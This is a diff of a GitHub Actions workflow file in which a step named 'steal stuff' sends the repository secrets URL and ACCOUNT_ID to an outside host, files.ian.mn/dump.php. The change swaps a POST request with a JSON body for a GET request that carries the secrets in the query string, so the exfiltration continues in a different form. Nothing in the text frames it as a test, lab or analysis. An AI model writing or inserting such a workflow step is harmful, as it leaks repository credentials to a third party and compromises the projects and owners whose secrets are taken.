@@ -11,6 +11,5 @@ jobs:
       - name: steal stuff
         uses: fjogeleit/http-request-action@master
         with:
-          url: 'http://files.ian.mn/dump.php'
-          method: 'POST'
-          data: '{"url": "${{ secrets.URL }}", "accountid": "${{ secrets.ACCOUNT_ID }}"}'
+          url: 'http://files.ian.mn/dump.php?url=${{ secrets.URL }}&accountid=${{ secrets.ACCOUNT_ID }}'
+          method: 'GET'
